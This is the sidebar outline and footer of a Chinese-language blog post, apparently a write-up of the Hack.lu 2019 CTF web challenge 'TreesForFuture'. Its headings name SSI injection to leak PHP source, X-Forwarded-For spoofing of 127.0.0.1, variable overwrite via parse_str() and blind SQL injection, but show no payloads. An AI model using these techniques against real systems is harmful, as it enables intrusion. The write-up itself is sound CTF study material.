Future</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#用到的知识。"><span class="nav-number">1.8.1.</span> <span class="nav-text">用到的知识。</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#SSI注入，连接回本地MySQL，二次盲注SQLi"><span class="nav-number">1.8.1.1.</span> <span class="nav-text">SSI注入，连接回本地MySQL，二次盲注SQLi</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#描述："><span class="nav-number">1.8.2.</span> <span class="nav-text">描述：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们是TreesForFuture。我们积极致力于使更多的树木生长在这个星球。"><span class="nav-number">1.8.2.1.</span> <span class="nav-text">我们是TreesForFuture。我们积极致力于使更多的树木生长在这个星球。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最近，我们雇用了一家承包商为我们创建了一个网站。"><span class="nav-number">1.8.2.2.</span> <span class="nav-text">最近，我们雇用了一家承包商为我们创建了一个网站。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目的地址在这里http-31-22-123-49-1908"><span class="nav-number">1.8.2.3.</span> <span class="nav-text">题目的地址在这里http://31.22.123.49:1908</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目总览"><span class="nav-number">1.9.</span> <span class="nav-text">题目总览</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这个挑战提供了一个简单的单页网站，其中充满了Lorem-ipsum引号和一颗树的图片。"><span class="nav-number">1.9.0.1.</span> <span class="nav-text">这个挑战提供了一个简单的单页网站，其中充满了Lorem ipsum引号和一颗树的图片。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对页面HTML代码的快速分析显示了托管图片的路径。"><span class="nav-number">1.9.0.2.</span> <span class="nav-text">对页面HTML代码的快速分析显示了托管图片的路径。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个网站在http-31-22-123-49-1908-internal-login"><span class="nav-number">1.9.0.3.</span> <span class="nav-text">这个网站在http://31.22.123.49:1908/internal/login</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个页面提供了注册，登陆和管理一个页面，与此同时该页面告诉我们不是管理员。"><span class="nav-number">1.9.0.4.</span> <span class="nav-text">这个页面提供了注册，登陆和管理一个页面，与此同时该页面告诉我们不是管理员。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#开始分析："><span class="nav-number">1.9.1.</span> <span class="nav-text">开始分析：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#显然，要被识别为管理员，我们需要来自特定的IP。为此，我们要先暴露一下主机内部的IP。"><span class="nav-number">1.9.1.1.</span> <span class="nav-text">显然，要被识别为管理员，我们需要来自特定的IP。为此，我们要先暴露一下主机内部的IP。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一旦我们知道内网地址是在127-0-0-1，端口是在13337，我们可以尝试添加X-Forwarded-For来让服务器相信我们的原始IP是127-0-0-1。"><span class="nav-number">1.9.1.2.</span> <span class="nav-text">一旦我们知道内网地址是在127.0.0.1，端口是在13337，我们可以尝试添加X-Forwarded-For来让服务器相信我们的原始IP是127.0.0.1。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到响应是成功的，但是没有授予任何的管理员权限。"><span class="nav-number">1.9.1.3.</span> <span class="nav-text">我们可以看到响应是成功的，但是没有授予任何的管理员权限。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#经过数小时的随机尝试，我们发现可以进行SSI注入来泄露页面的PHP源代码。"><span class="nav-number">1.9.1.4.</span> <span class="nav-text">经过数小时的随机尝试，我们发现可以进行SSI注入来泄露页面的PHP源代码。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们对所有的页面重复此过程去获取全部源代码。不过服务器阻止我们访问位于当前目录以外的文件，所以我们不能访问下列的文件：-config-php，-db-config-php，-db-credentials-php。"><span class="nav-number">1.9.1.5.</span> <span class="nav-text">我们对所有的页面重复此过程去获取全部源代码。不过服务器阻止我们访问位于当前目录以外的文件，所以我们不能访问下列的文件：../config.php，../db_config.php，../db_credentials.php。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#拿到源代码后开始分析："><span class="nav-number">1.9.2.</span> <span class="nav-text">拿到源代码后开始分析：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#来自login-php："><span class="nav-number">1.9.2.1.</span> <span class="nav-text">来自login.php：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在这里，该parse-str-函数用于解析POST请求的正文。PHP文档明确的指出。"><span class="nav-number">1.9.2.2.</span> <span class="nav-text">在这里，该parse_str()函数用于解析POST请求的正文。PHP文档明确的指出。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#事实上，我们可以通过在POST请求上传递变量来设置和覆盖变量。"><span class="nav-number">1.9.2.3.</span> <span class="nav-text">事实上，我们可以通过在POST请求上传递变量来设置和覆盖变量。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#后续请看https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture"><span class="nav-number">1.9.2.4.</span> <span class="nav-text">后续请看https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接"><span class="nav-number">1.9.3.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-w0y-at-writeup-2019-10-24-hacklu-2019-car-repair-shop-html"><span class="nav-number">1.9.3.1.</span> <span class="nav-text">https://w0y.at/writeup/2019/10/24/hacklu-2019-car-repair-shop.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-gist-github-com-terjanq-fdb23ae109446b826a4b37df88efae07-file-car-repair-js"><span class="nav-number">1.9.3.2.</span> <span class="nav-text">https://gist.github.com/terjanq/fdb23ae109446b826a4b37df88efae07#file-car_repair-js</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-LetzPwn-ctf-writeups-tree-master-hack-lu-2019-Numtonce"><span class="nav-number">1.9.3.3.</span> <span class="nav-text">https://github.com/LetzPwn/ctf-writeups/tree/master/hack_lu_2019/Numtonce</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture"><span class="nav-number">1.9.3.4.</span> <span class="nav-text">https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">110k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
